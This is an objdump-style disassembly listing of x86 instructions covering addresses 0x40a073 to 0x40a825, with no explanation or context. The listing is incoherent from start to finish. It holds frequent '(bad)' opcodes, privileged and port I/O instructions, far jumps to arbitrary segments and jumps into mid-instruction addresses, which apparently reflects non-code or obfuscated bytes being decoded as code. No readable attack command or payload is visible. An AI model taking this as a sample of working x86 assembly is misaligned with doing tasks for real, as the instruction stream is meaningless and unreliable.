  40a073:	cmp    eax,0x144146bd
  40a078:	mov    ebp,0x486ff054
  40a07d:	push   cs
  40a07e:	dec    ebx
  40a080:	ins    DWORD PTR es:[edi],dx
  40a081:	mov    ds:0x619d7de6,eax
  40a086:	mov    cl,0x7a
  40a088:	icebp  
  40a089:	mov    esp,0x3b3bfdd0
  40a08e:	in     eax,dx
  40a08f:	aad    0x8c
  40a091:	arpl   ax,ax
  40a093:	cmp    ebx,eax
  40a095:	push   edi
  40a096:	aaa    
  40a097:	mov    eax,0xb92339af
  40a09c:	mov    edx,0x98006123
  40a0a1:	imul   DWORD PTR [ebp-0xa]
  40a0a4:	or     eax,0xe916913c
  40a0a9:	pop    ebx
  40a0aa:	fisttp QWORD PTR [edx-0x39573746]
  40a0b0:	pop    edx
  40a0b1:	sub    BYTE PTR ds:0x4727c861,bh
  40a0b7:	(bad)  
  40a0b8:	mov    ecx,0x3ab01e5
  40a0bd:	and    al,0x87
  40a0bf:	test   eax,0xdb354ad2
  40a0c4:	mov    bl,0x81
  40a0c6:	mov    al,ds:0xbdba25e9
  40a0cb:	(bad)  
  40a0cd:	pop    ebp
  40a0ce:	fsub   DWORD PTR [esi+eax*8]
  40a0d1:	pop    edx
  40a0d2:	stc    
  40a0d3:	xchg   edx,eax
  40a0d4:	adc    ebp,edx
  40a0d6:	mov    edi,0x1012b8c1
  40a0db:	adc    DWORD PTR [ecx-0x5e10238c],eax
  40a0e1:	fild   QWORD PTR [eax+ebx*8-0x29a53068]
  40a0e8:	test   al,0x70
  40a0ea:	mov    cl,0x9b
  40a0ec:	dec    ebp
  40a0ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0ee:	mov    eax,0x7bb4f276
  40a0f3:	pop    ecx
  40a0f4:	stos   DWORD PTR es:[edi],eax
  40a0f5:	int3   
  40a0f6:	mov    ecx,0x69075b6a
  40a0fb:	dec    esi
  40a0fc:	inc    edx
  40a0fd:	ja     0x40a09d
  40a0ff:	dec    esp
  40a100:	lahf   
  40a101:	mov    BYTE PTR [ebx-0x536053fd],al
  40a107:	adc    al,0xa1
  40a109:	call   0xbdd5dae2
  40a10e:	(bad)  
  40a10f:	in     al,0x32
  40a111:	sbb    BYTE PTR [ecx-0x5c6e3b66],0xc9
  40a118:	xor    eax,0xfb75d91d
  40a11d:	lods   eax,DWORD PTR ds:[esi]
  40a11e:	shr    DWORD PTR [esi+0x13],1
  40a121:	jge    0x40a0d4
  40a123:	jo     0x40a109
  40a125:	dec    edx
  40a126:	call   0x1deb:0x209f77bc
  40a12d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a12e:	dec    ebx
  40a12f:	mov    ecx,0xf3960ca
  40a134:	(bad)  
  40a135:	xchg   DWORD PTR [ecx+0x5e32cddb],esp
  40a13b:	inc    ebp
  40a13c:	jmp    0x48dc:0xea2e039f
  40a143:	push   es
  40a144:	out    dx,eax
  40a145:	cmp    bl,ch
  40a147:	out    dx,eax
  40a148:	inc    esi
  40a149:	mov    esi,0xa74196f4
  40a14e:	pop    ebx
  40a14f:	push   cs
  40a150:	add    BYTE PTR [eax],ah
  40a152:	sar    BYTE PTR [eax],1
  40a154:	lea    eax,[esi-0x29ccfcaf]
  40a15a:	xlat   BYTE PTR ds:[ebx]
  40a15b:	popa   
  40a15c:	dec    ebx
  40a15d:	lods   eax,DWORD PTR ds:[esi]
  40a15e:	push   eax
  40a15f:	pop    ebp
  40a160:	sti    
  40a161:	stos   DWORD PTR es:[edi],eax
  40a162:	and    ebp,DWORD PTR [ebx-0x437ebd11]
  40a168:	sub    BYTE PTR [edx-0x3],0x3d
  40a16c:	into   
  40a16d:	call   ebx
  40a16f:	leave  
  40a170:	je     0x40a12a
  40a172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a173:	aaa    
  40a174:	mov    ecx,0x820f3b4a
  40a179:	mov    ah,0xb5
  40a17b:	cmp    BYTE PTR [edx-0x1f],bl
  40a17e:	push   edx
  40a17f:	sar    BYTE PTR [eax+eiz*4+0x46],cl
  40a183:	mov    cl,0x8f
  40a185:	clc    
  40a186:	mov    edi,0x47acdab
  40a18b:	aas    
  40a18c:	lea    esp,[edi+ebx*1+0x5b688339]
  40a193:	and    DWORD PTR [edx-0x30f02502],ebx
  40a199:	fidiv  DWORD PTR [esi]
  40a19b:	add    al,0x83
  40a19d:	ret    
  40a19e:	pop    eax
  40a19f:	arpl   WORD PTR [esi-0x52],dx
  40a1a2:	test   DWORD PTR [ebx],edx
  40a1a4:	mov    cs,WORD PTR [ebp-0x49]
  40a1a7:	cwde   
  40a1a8:	cdq    
  40a1a9:	lock and eax,0x1225e057
  40a1af:	dec    si
  40a1b1:	inc    edi
  40a1b2:	adc    eax,0xacf06aea
  40a1b7:	inc    ecx
  40a1b8:	(bad)  
  40a1b9:	leave  
  40a1ba:	or     ah,BYTE PTR [edx+0x6c]
  40a1bd:	or     ch,BYTE PTR [ebx+edx*4+0x6a40a909]
  40a1c4:	push   ebp
  40a1c5:	(bad)  
  40a1c6:	adc    al,0xde
  40a1c8:	pushf  
  40a1c9:	sbb    DWORD PTR [ecx],eax
  40a1cb:	adc    DWORD PTR [edi+ecx*8-0x7d339112],eax
  40a1d2:	cmp    al,0xbb
  40a1d4:	mov    ds:0x6ea401d3,eax
  40a1d9:	shl    DWORD PTR [edx+ebp*2+0x72939614],1
  40a1e0:	mov    eax,ds:0xbe92d583
  40a1e5:	(bad)  
  40a1e6:	jns    0x40a23f
  40a1e8:	bound  eax,QWORD PTR [edi-0x2957c2a5]
  40a1ee:	int3   
  40a1ef:	out    dx,al
  40a1f0:	cmp    dl,dl
  40a1f2:	(bad)  
  40a1f3:	stos   BYTE PTR es:[edi],al
  40a1f4:	ror    DWORD PTR [edi],1
  40a1f6:	and    bh,BYTE PTR [ebp+ebx*2-0x6e345efe]
  40a1fd:	dec    ebx
  40a1fe:	inc    esi
  40a1ff:	inc    ebp
  40a200:	cwde   
  40a201:	pop    ds
  40a202:	(bad)  
  40a203:	rol    DWORD PTR [ebp-0x27],cl
  40a206:	add    DWORD PTR [eax+0x217fc2af],0xffffff9d
  40a20d:	dec    edi
  40a20e:	or     dh,BYTE PTR [edi-0x37]
  40a211:	test   eax,ecx
  40a213:	xchg   ecx,eax
  40a214:	jg     0x40a202
  40a216:	arpl   WORD PTR [edi-0x6],sp
  40a219:	retf   
  40a21a:	cdq    
  40a21b:	jbe    0x40a25d
  40a21d:	icebp  
  40a21e:	imul   ebx,DWORD PTR [edi+0x7e2e042e],0x22
  40a225:	lds    edi,FWORD PTR [eax]
  40a227:	sahf   
  40a228:	jns    0x40a240
  40a22a:	or     DWORD PTR [eax+edi*8+0x7c68d4a],esp
  40a231:	gs nop
  40a233:	loopne 0x40a253
  40a235:	icebp  
  40a236:	sub    DWORD PTR [ebp-0x3c65a2d9],0x447270b8
  40a240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a241:	or     ch,cl
  40a243:	es xchg edx,eax
  40a245:	jae    0x40a29d
  40a247:	adc    al,0x98
  40a249:	mov    DWORD PTR [ecx],ebp
  40a24b:	push   esp
  40a24c:	pusha  
  40a24d:	add    eax,0x2b4cc88
  40a252:	out    0xeb,eax
  40a254:	ds movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40a257:	dec    esp
  40a258:	ror    BYTE PTR [esi+0x4176cac],cl
  40a25e:	push   ebp
  40a25f:	jmp    0x40a2cc
  40a261:	rcl    BYTE PTR [ecx-0x37],1
  40a264:	push   ebp
  40a265:	(bad)
  40a268:	imul   esi,DWORD PTR [ecx-0x21],0xba1f182f
  40a26f:	lock outs dx,BYTE PTR ds:[esi]
  40a271:	idiv   DWORD PTR [ecx+0x27807d9c]
  40a277:	lods   al,BYTE PTR ds:[esi]
  40a278:	loopne 0x40a289
  40a27a:	and    DWORD PTR [edx+ecx*4],edx
  40a27d:	ud0    edx,DWORD PTR [edx+ebx*1+0x599eb314]
  40a285:	imul   bh
  40a287:	mov    BYTE PTR [ebx+0x3e4943d2],ah
  40a28d:	mov    ds,WORD PTR ds:0xe95a73b
  40a293:	rcr    DWORD PTR [edi-0x53],cl
  40a296:	jecxz  0x40a2e7
  40a298:	popf   
  40a299:	gs cmp eax,0x9b313e94
  40a29f:	mov    ebp,0x701c9379
  40a2a4:	fwait
  40a2a5:	sub    eax,0x9a9dd1b3
  40a2aa:	loop   0x40a2d4
  40a2ac:	sbb    esi,DWORD PTR [ebx-0x6e7de13b]
  40a2b2:	ja     0x40a2ad
  40a2b4:	pop    edx
  40a2b5:	sti    
  40a2b6:	or     eax,0x44fff0ff
  40a2bb:	sub    al,0x4e
  40a2bd:	ja     0x40a2de
  40a2bf:	push   es
  40a2c0:	add    al,0xac
  40a2c2:	rol    DWORD PTR [esi+0x3d],0xcc
  40a2c6:	stos   DWORD PTR es:[edi],eax
  40a2c7:	pusha  
  40a2c8:	call   0xa3b6:0xfdc062bb
  40a2cf:	retf   0x6bae
  40a2d2:	mov    ah,0x57
  40a2d4:	out    0x43,al
  40a2d6:	mov    ds:0x8d7263c1,eax
  40a2db:	cmp    ebp,ebx
  40a2dd:	ja     0x40a314
  40a2df:	jge    0x40a356
  40a2e1:	jmp    0x61529e09
  40a2e6:	mov    bh,0x88
  40a2e8:	xchg   bl,bh
  40a2ea:	adc    eax,0xf4543036
  40a2ef:	xchg   ecx,eax
  40a2f0:	dec    esp
  40a2f1:	mov    esi,0x6de37318
  40a2f6:	jecxz  0x40a365
  40a2f8:	scas   eax,DWORD PTR es:[edi]
  40a2f9:	imul   ecx,eax,0x67763f3f
  40a2ff:	je     0x40a2df
  40a301:	ss scas al,BYTE PTR es:[edi]
  40a303:	pop    ebx
  40a304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a305:	dec    edi
  40a306:	mov    ecx,0x7203ec21
  40a30b:	mov    eax,0x1471aae6
  40a310:	mov    ebx,0xf6940f08
  40a315:	mov    bh,BYTE PTR [ebx-0x45]
  40a318:	call   0xcc6bc062
  40a31d:	jl     0x40a343
  40a31f:	xor    DWORD PTR [edx-0x26],ebp
  40a322:	cmp    BYTE PTR [edi],ch
  40a324:	pop    ds
  40a325:	shl    bh,0x78
  40a328:	jmp    0x3035e109
  40a32d:	adc    eax,esp
  40a32f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a330:	(bad)  [ebx+0x4dae1380]
  40a336:	cmp    BYTE PTR [ebx],cl
  40a338:	sub    DWORD PTR [ebx-0x54],0x9e8bb567
  40a33f:	mov    dl,BYTE PTR ds:0xe956e04c
  40a345:	and    DWORD PTR [eax-0x10],0x33
  40a349:	rol    DWORD PTR [edi+0x6f2c73b0],cl
  40a34f:	mov    BYTE PTR [esi+0x12],dh
  40a352:	cmp    bh,BYTE PTR [edx+eiz*2]
  40a355:	add    al,0x28
  40a357:	adc    DWORD PTR [ebp+0x23],0x69009f13
  40a35e:	bound  eax,QWORD PTR ds:0xa50637df
  40a364:	out    0xe9,al
  40a366:	dec    ebp
  40a367:	rcl    BYTE PTR [esi],0xdc
  40a36a:	jbe    0x40a3c9
  40a36c:	ret    0xeb61
  40a36f:	pop    edx
  40a370:	dec    ebp
  40a371:	js     0x40a38b
  40a373:	addr16 sbb bh,cl
  40a376:	xchg   edi,eax
  40a377:	mov    ds:0x97782fd7,al
  40a37c:	outs   dx,BYTE PTR ds:[esi]
  40a37d:	push   edx
  40a37e:	inc    ecx
  40a37f:	ds fs repnz dec esi
  40a383:	push   es
  40a384:	fcomip st,st(1)
  40a386:	je     0x40a340
  40a388:	xor    al,BYTE PTR [edx]
  40a38a:	in     eax,0x9a
  40a38c:	jne    0x40a368
  40a38e:	popa   
  40a38f:	xchg   ebx,eax
  40a390:	leave  
  40a391:	push   es
  40a392:	mov    ebx,0xc65e39b2
  40a397:	adc    al,0x5a
  40a399:	arpl   WORD PTR [ebx+eax*8],dx
  40a39c:	in     al,dx
  40a39d:	or     ah,BYTE PTR [ecx+edi*2]
  40a3a0:	shl    BYTE PTR ds:0x539bd340,cl
  40a3a6:	sahf   
  40a3a7:	jl     0x40a379
  40a3a9:	lock dec edx
  40a3ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3ac:	mov    ah,0x8d
  40a3ae:	dec    edi
  40a3af:	test   DWORD PTR [ebx+0x41],ebx
  40a3b2:	in     al,0xdc
  40a3b4:	repz cmp esp,DWORD PTR [ecx+eiz*2]
  40a3b8:	mov    dl,0x8f
  40a3ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3bb:	mov    esi,0xf6de8337
  40a3c0:	out    dx,al
  40a3c1:	mov    ch,0x2b
  40a3c3:	aam    0xa9
  40a3c5:	or     esp,DWORD PTR [ebx]
  40a3c7:	cmp    eax,0xb42851e2
  40a3cc:	and    BYTE PTR [ebx],bh
  40a3ce:	xchg   esi,eax
  40a3cf:	enter  0xa2fb,0xc1
  40a3d3:	lods   eax,DWORD PTR ds:[esi]
  40a3d4:	mov    al,ds:0x9b462e43
  40a3d9:	ins    BYTE PTR es:[edi],dx
  40a3da:	sbb    ecx,DWORD PTR [eax]
  40a3dc:	cmp    DWORD PTR [ebp-0x67],edi
  40a3df:	and    ah,BYTE PTR [ebx+0x3a06691e]
  40a3e5:	mov    bh,0xd8
  40a3e7:	sbb    ecx,edx
  40a3e9:	dec    BYTE PTR [eax]
  40a3eb:	xor    al,0x6b
  40a3ed:	jns    0x40a3d3
  40a3ef:	stos   BYTE PTR es:[edi],al
  40a3f0:	stos   DWORD PTR es:[edi],eax
  40a3f1:	sahf   
  40a3f2:	icebp  
  40a3f3:	dec    edx
  40a3f4:	nop
  40a3f5:	mov    esi,edi
  40a3f7:	aam    0xef
  40a3f9:	sbb    eax,0xd80098be
  40a3fe:	dec    esi
  40a3ff:	loope  0x40a3a4
  40a401:	js     0x40a449
  40a403:	push   ss
  40a404:	jnp    0x40a3cd
  40a406:	push   es
  40a407:	jl     0x40a45d
  40a409:	inc    esi
  40a40a:	les    esp,FWORD PTR [esi+0x60]
  40a40d:	pusha  
  40a40e:	push   ecx
  40a40f:	bound  esp,QWORD PTR [edx-0x44e64569]
  40a415:	test   DWORD PTR [esi+0x53],esi
  40a418:	xchg   esp,eax
  40a419:	lea    ebx,[edx+0x58278617]
  40a41f:	and    DWORD PTR [edx-0x299c694f],ebp
  40a425:	fadd   DWORD PTR [eax]
  40a427:	inc    ecx
  40a428:	repz lock mov ds:0xbc30c87b,al
  40a42f:	sub    al,0x6
  40a431:	imul   edi,DWORD PTR [ecx-0x17],0x90ea009f
  40a438:	inc    esi
  40a439:	adc    BYTE PTR ds:0xa1811ec2,dl
  40a43f:	nop    DWORD PTR [eax]
  40a442:	sub    eax,0xe8ab38f2
  40a447:	test   BYTE PTR [edi],0xbb
  40a44a:	jo     0x40a4a5
  40a44c:	(bad)  
  40a44d:	fld    DWORD PTR [eax+0x5d]
  40a450:	sub    ch,ch
  40a452:	enter  0x8817,0x77
  40a456:	scas   eax,DWORD PTR es:[edi]
  40a457:	add    esi,DWORD PTR [eax+esi*4-0x669a6b2e]
  40a45e:	push   edi
  40a45f:	sbb    DWORD PTR [ebx+0x29ebe841],ebx
  40a465:	xor    ebx,0xa6ca91c
  40a46b:	aas    
  40a46c:	shl    ecx,cl
  40a46e:	ins    DWORD PTR es:[edi],dx
  40a46f:	jle    0x40a4e1
  40a471:	fisttp WORD PTR [eax-0x2f6ff5b1]
  40a477:	dec    ebp
  40a478:	in     eax,dx
  40a479:	cdq    
  40a47a:	(bad)  
  40a47b:	adc    BYTE PTR [ebx+eax*2],ah
  40a47e:	xchg   edi,eax
  40a47f:	mov    eax,0xf8405336
  40a484:	mov    ds:0x2d185e02,al
  40a489:	outs   dx,BYTE PTR ds:[esi]
  40a48a:	jl     0x40a417
  40a48c:	xor    BYTE PTR [edx-0x4f2146af],al
  40a492:	cmp    al,0xa6
  40a494:	mov    esi,0xdf321d67
  40a499:	push   esp
  40a49a:	push   ebp
  40a49b:	stc    
  40a49c:	scas   al,BYTE PTR es:[edi]
  40a49d:	jl     0x40a4c7
  40a49f:	cmc    
  40a4a0:	popf   
  40a4a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4a2:	(bad)  
  40a4a3:	mov    ah,0x5e
  40a4a5:	popa   
  40a4a6:	fcomp  QWORD PTR [ebp-0x1f]
  40a4a9:	dec    eax
  40a4aa:	mov    DWORD PTR [esi],esp
  40a4ac:	out    dx,eax
  40a4ad:	sub    DWORD PTR [edi+0x2a],edx
  40a4b0:	pop    ebx
  40a4b1:	lds    esp,FWORD PTR [edi-0x6b]
  40a4b4:	sbb    BYTE PTR [ebp+ebp*2-0x3c],bh
  40a4b8:	je     0x40a52f
  40a4ba:	std    
  40a4bb:	sbb    eax,0xe153f92a
  40a4c0:	jae    0x40a4ff
  40a4c2:	or     DWORD PTR [edi-0x5a5d5b5e],edi
  40a4c8:	push   esp
  40a4c9:	jb     0x40a4d6
  40a4cb:	sahf   
  40a4cc:	jl     0x40a508
  40a4ce:	dec    eax
  40a4cf:	mov    ah,0xcd
  40a4d1:	jmp    0x1c01:0xc46b843
  40a4d8:	aaa    
  40a4d9:	aad    0xc6
  40a4db:	add    ebp,ebx
  40a4dd:	inc    edx
  40a4de:	fld    QWORD PTR [edx+eiz*8-0x3b]
  40a4e2:	sbb    ch,bl
  40a4e4:	dec    eax
  40a4e5:	pushf  
  40a4e6:	and    edx,esi
  40a4e8:	adc    eax,0x936d6de
  40a4ed:	xchg   esi,eax
  40a4ee:	test   DWORD PTR [eax-0x72],ebp
  40a4f1:	(bad)  
  40a4f2:	push   0x77df1898
  40a4f7:	fs add al,0x30
  40a4fa:	jle    0x40a4f4
  40a4fc:	mov    esp,0x636bdadb
  40a501:	cmp    BYTE PTR [edi],0xe2
  40a504:	mov    esp,0xdf690c07
  40a509:	mov    gs,WORD PTR [ebp+0x2d]
  40a50c:	mov    esp,0x3883929f
  40a511:	pusha  
  40a512:	mov    dh,0x75
  40a514:	pop    ss
  40a515:	std    
  40a516:	arpl   WORD PTR [ecx+ecx*2],ax
  40a519:	mov    eax,0x2d0f561
  40a51e:	ja     0x40a54f
  40a520:	pop    esi
  40a521:	mov    ds:0x14376ea9,eax
  40a526:	enter  0x28fa,0x37
  40a52a:	mov    ecx,ebx
  40a52c:	fucomi st,st(1)
  40a52e:	or     dh,BYTE PTR [esp+ecx*1]
  40a531:	cmp    eax,0x90a03124
  40a536:	push   ebp
  40a537:	clc    
  40a538:	mov    bl,0xe1
  40a53a:	xchg   dh,ah
  40a53c:	cmc    
  40a53d:	mov    edx,0xf978b343
  40a542:	retf   0x24dc
  40a545:	aad    0xb
  40a547:	sbb    BYTE PTR [ecx-0x730bdad8],bh
  40a54d:	xchg   edx,eax
  40a54e:	ror    BYTE PTR [edi],1
  40a550:	shl    BYTE PTR [ebp+0x7d3acb0f],0x1c
  40a557:	fmulp  st(7),st
  40a559:	ret    
  40a55a:	hlt    
  40a55b:	jmp    0x4025:0x72ee434e
  40a562:	cmp    ah,ah
  40a564:	sub    BYTE PTR [esi],dh
  40a566:	and    BYTE PTR [eax+0xf8e6b6b],al
  40a56c:	sub    al,0x42
  40a56e:	mov    cl,0x3d
  40a570:	dec    esp
  40a571:	jmp    0x450fcf73
  40a576:	je     0x40a5cb
  40a578:	add    BYTE PTR [edi+0x2eed91d],0xdd
  40a57f:	or     BYTE PTR [esi-0x52],0x3
  40a583:	out    0x43,eax
  40a585:	jl     0x40a54a
  40a587:	repnz daa 
  40a589:	xchg   ebx,eax
  40a58a:	push   cs
  40a58b:	jle    0x40a5fa
  40a58d:	jb     0x40a60c
  40a58f:	and    edi,DWORD PTR [esi+0x6a306784]
  40a595:	js     0x40a54f
  40a597:	gs sub eax,0x5abd6071
  40a59d:	gs jmp 0x40a55d
  40a5a0:	dec    ebx
  40a5a1:	push   0xffffffb4
  40a5a3:	ja     0x40a531
  40a5a5:	rdtsc  
  40a5a7:	fwait
  40a5a8:	rcr    BYTE PTR [ecx-0x5fa51fa5],0x3a
  40a5af:	sub    ch,BYTE PTR [ebx+0x56]
  40a5b2:	mov    eax,0x38157d05
  40a5b7:	add    dl,bl
  40a5b9:	aaa    
  40a5ba:	retf   0x6d5c
  40a5bd:	aaa    
  40a5be:	mov    esp,0xeab58a77
  40a5c3:	pop    eax
  40a5c4:	scas   eax,DWORD PTR es:[edi]
  40a5c5:	ret    0x531d
  40a5c8:	xchg   BYTE PTR [eax],bl
  40a5ca:	rcl    DWORD PTR [ebp+0x7ae1b355],0xcb
  40a5d1:	fnstsw WORD PTR [esp+ebp*4]
  40a5d4:	jmp    0x40a5b4
  40a5d6:	pop    ebp
  40a5d7:	inc    ebx
  40a5d8:	pop    es
  40a5d9:	inc    edx
  40a5da:	stos   DWORD PTR es:[edi],eax
  40a5db:	cdq    
  40a5dc:	ins    BYTE PTR es:[edi],dx
  40a5dd:	xor    ebx,ebx
  40a5df:	mov    al,0x63
  40a5e1:	lahf   
  40a5e2:	(bad)  
  40a5e3:	arpl   di,bx
  40a5e5:	cdq    
  40a5e6:	push   ecx
  40a5e7:	stc    
  40a5e8:	cmp    al,0x41
  40a5ea:	std    
  40a5eb:	or     DWORD PTR [esi],ecx
  40a5ed:	pop    edx
  40a5ee:	push   0x2e6b9799
  40a5f3:	popf   
  40a5f4:	mov    ecx,0xd49508a6
  40a5f9:	pop    ebp
  40a5fa:	(bad)  [ebp+0x603918a8]
  40a601:	pop    ecx
  40a602:	ja     0x40a681
  40a604:	imul   edi,ebp,0x64
  40a607:	stos   DWORD PTR es:[edi],eax
  40a608:	cmp    BYTE PTR [edi],ch
  40a60a:	packsswb mm0,QWORD PTR [esi]
  40a60d:	mov    eax,0xd00b0672
  40a612:	push   es
  40a613:	std    
  40a614:	add    BYTE PTR ds:0xd6296802,ah
  40a61a:	sub    DWORD PTR [esi-0x52],0x56d35fd0
  40a621:	push   ds
  40a622:	shl    DWORD PTR [edx+edx*1+0x28],0xc8
  40a627:	add    DWORD PTR [ebx],edx
  40a629:	stc    
  40a62a:	sahf   
  40a62b:	xchg   ebx,eax
  40a62c:	jbe    0x40a5cf
  40a62e:	inc    esi
  40a62f:	push   edx
  40a630:	jl     0x2afd029f
  40a636:	jo     0x40a65d
  40a638:	dec    DWORD PTR [ebp+ebp*1+0x5593279d]
  40a63f:	je     0x40a665
  40a641:	rcl    DWORD PTR [ebp-0x31aed3c1],cl
  40a647:	xchg   ecx,eax
  40a648:	dec    ebx
  40a649:	jmp    0x3879ac39
  40a64e:	adc    al,0x4c
  40a650:	sbb    DWORD PTR [edi+0x8],ebx
  40a653:	xchg   ebp,eax
  40a654:	icebp  
  40a655:	pusha  
  40a656:	xchg   edi,eax
  40a657:	jmp    FWORD PTR [ecx-0x331f52a7]
  40a65d:	xor    dh,0xad
  40a660:	dec    ebp
  40a661:	mov    esi,DWORD PTR [edx-0x5c]
  40a664:	frstor [edi]
  40a666:	daa    
  40a667:	ds std 
  40a669:	xchg   BYTE PTR [ebp+0x2],dl
  40a66c:	retf   
  40a66d:	and    esi,ebp
  40a66f:	pop    ecx
  40a670:	repnz repnz cli 
  40a673:	and    BYTE PTR [edx-0x1f90a16f],0x8a
  40a67a:	pop    edi
  40a67b:	out    dx,al
  40a67c:	fdiv   DWORD PTR [edx]
  40a67e:	sti    
  40a67f:	shl    DWORD PTR [eax+edx*2+0x36dcdfc4],0xc2
  40a687:	aad    0x57
  40a689:	mov    WORD PTR [edi+0x757860],?
  40a68f:	call   0x81dd:0x1310f644
  40a696:	sbb    al,0x43
  40a698:	and    ecx,DWORD PTR [esi+edx*2-0x52]
  40a69c:	jno    0x40a639
  40a69e:	(bad)  [eax]
  40a6a0:	cmp    DWORD PTR [esi],esi
  40a6a2:	pushf  
  40a6a3:	add    ecx,edi
  40a6a5:	add    al,0xd4
  40a6a7:	test   eax,0x48838ffc
  40a6ac:	test   al,dh
  40a6ae:	mov    BYTE PTR [edi+0x6685af3e],ch
  40a6b4:	sbb    BYTE PTR [edx-0x2df2b188],bl
  40a6ba:	mov    bl,0x59
  40a6bc:	inc    edx
  40a6bd:	shl    BYTE PTR [ebp-0x1875f611],0x86
  40a6c4:	pop    edi
  40a6c5:	xor    esi,eax
  40a6c7:	fnsave [esi-0x1bbe7d8d]
  40a6cd:	dec    ebp
  40a6ce:	push   es
  40a6cf:	xchg   esi,eax
  40a6d0:	jmp    0x4847feeb
  40a6d5:	(bad)  [edi+0x1aa194fe]
  40a6db:	push   0x37
  40a6dd:	arpl   WORD PTR [edx-0x430ba1f4],di
  40a6e3:	jo     0x40a738
  40a6e5:	jg     0x40a6c2
  40a6e7:	shr    edx,0x72
  40a6ea:	int3   
  40a6eb:	cdq    
  40a6ec:	jecxz  0x40a71e
  40a6ee:	ins    BYTE PTR es:[edi],dx
  40a6ef:	pusha  
  40a6f0:	pushf  
  40a6f1:	adc    BYTE PTR [esi-0x30],ah
  40a6f4:	or     ah,BYTE PTR [edi]
  40a6f6:	cdq    
  40a6f7:	add    dl,BYTE PTR [edx-0x32]
  40a6fa:	sub    ebp,DWORD PTR [eax-0x2d]
  40a6fd:	sar    DWORD PTR [ebx+0x38132ee5],0x1b
  40a704:	test   al,0xd9
  40a706:	loopne 0x40a77d
  40a708:	xchg   esp,eax
  40a709:	adc    ch,0x9
  40a70c:	(bad)  
  40a70d:	push   eax
  40a70e:	loop   0x40a76d
  40a710:	inc    ebp
  40a711:	test   DWORD PTR [esi],0xfd73c021
  40a717:	xchg   ebx,eax
  40a718:	and    ecx,DWORD PTR [eax]
  40a71a:	imul   edi,DWORD PTR [ecx+0x795001c1],0x5c
  40a721:	sub    eax,edi
  40a723:	jns    0x40a6c9
  40a725:	cdq    
  40a726:	mov    ds:0xcf692fde,eax
  40a72b:	mov    bl,0x52
  40a72d:	push   esi
  40a72e:	sbb    al,BYTE PTR [ebp+edi*8+0x12943843]
  40a735:	lahf   
  40a736:	stos   BYTE PTR es:[edi],al
  40a737:	retf   
  40a738:	mov    edx,0x7b803373
  40a73d:	test   DWORD PTR [edi+0x72],eax
  40a740:	push   ss
  40a741:	stos   DWORD PTR es:[edi],eax
  40a742:	loopne 0x40a736
  40a744:	mov    ah,0xf7
  40a746:	push   ecx
  40a747:	mov    bl,0xed
  40a749:	retf   
  40a74a:	sahf   
  40a74b:	lahf   
  40a74c:	mov    ebp,0x65c320c2
  40a751:	lock loopne 0x40a6e7
  40a754:	ds iret 
  40a756:	sbb    bl,dl
  40a758:	ror    BYTE PTR [esi-0x47343bd5],1
  40a75e:	xor    esi,DWORD PTR [ecx-0x5b612c79]
  40a764:	arpl   WORD PTR [edx-0x30],si
  40a767:	arpl   WORD PTR [esi-0x78],cx
  40a76a:	add    bl,al
  40a76c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a76d:	lods   eax,DWORD PTR ds:[esi]
  40a76e:	cli    
  40a76f:	xor    ecx,DWORD PTR [ebx-0x15]
  40a772:	xchg   edi,eax
  40a773:	mov    ebp,DWORD PTR [edx-0x6472573d]
  40a779:	add    ebx,DWORD PTR [ebp-0x735c39cc]
  40a77f:	sbb    DWORD PTR [eax-0x6d],eax
  40a782:	popa   
  40a783:	dec    esi
  40a784:	inc    eax
  40a785:	shl    ah,0x2
  40a788:	test   eax,0xc95c5617
  40a78d:	cmp    dh,ch
  40a78f:	add    al,0xec
  40a791:	xchg   esp,eax
  40a792:	shl    BYTE PTR [edi+0x51fc4deb],0xd8
  40a799:	and    ebp,DWORD PTR [ebp+0x78]
  40a79c:	or     al,0xa9
  40a79e:	push   cs
  40a79f:	inc    esi
  40a7a0:	popa   
  40a7a1:	pop    ebp
  40a7a2:	jg     0x40a793
  40a7a4:	push   0x934aedbd
  40a7a9:	cmp    al,0x3a
  40a7ab:	jne    0x40a782
  40a7ad:	jbe    0x40a80d
  40a7af:	mov    ds:0x5b7a85d,al
  40a7b4:	repz (bad) 
  40a7b6:	or     DWORD PTR [ecx],ebp
  40a7b8:	sub    al,0xc3
  40a7ba:	jmp    0x35d7f4e8
  40a7bf:	pushf  
  40a7c0:	fild   WORD PTR [esi]
  40a7c2:	scas   al,BYTE PTR es:[edi]
  40a7c3:	pop    es
  40a7c4:	xor    ah,bh
  40a7c6:	sbb    al,0xff
  40a7c8:	pop    esi
  40a7c9:	mov    ebx,0x53e1ab5d
  40a7ce:	scas   al,BYTE PTR es:[edi]
  40a7cf:	xlat   BYTE PTR ds:[bx]
  40a7d1:	vxorps ymm2,ymm4,YMMWORD PTR [ecx-0x6e]
  40a7d6:	sub    edi,DWORD PTR [edx-0x62]
  40a7d9:	js     0x40a82d
  40a7db:	mov    eax,0x8a019457
  40a7e0:	mov    WORD PTR [edi+0x657349ba],cs
  40a7e6:	lock sbb ecx,DWORD PTR [eax-0x42]
  40a7ea:	int3   
  40a7eb:	sbb    DWORD PTR ds:0x6fd8f66d,0x7a714efa
  40a7f5:	mov    esp,0x76384cfa
  40a7fa:	adc    bl,BYTE PTR [esi]
  40a7fc:	in     al,dx
  40a7fd:	or     al,0x5c
  40a7ff:	hlt    
  40a800:	mov    bh,0x5f
  40a802:	mov    ebx,0xeae9a1b4
  40a807:	(bad)  
  40a808:	fdivr  st(4),st
  40a80a:	gs inc ecx
  40a80c:	sbb    al,0xad
  40a80e:	sub    ebp,DWORD PTR [esi-0x31523318]
  40a814:	cmp    dl,ch
  40a816:	rcl    BYTE PTR [ebx-0x1408a9c3],cl
  40a81c:	(bad)  
  40a81d:	mov    edx,0x3432b320
  40a822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a823:	arpl   WORD PTR [edi],di
  40a825:	mov    ah,0x9a
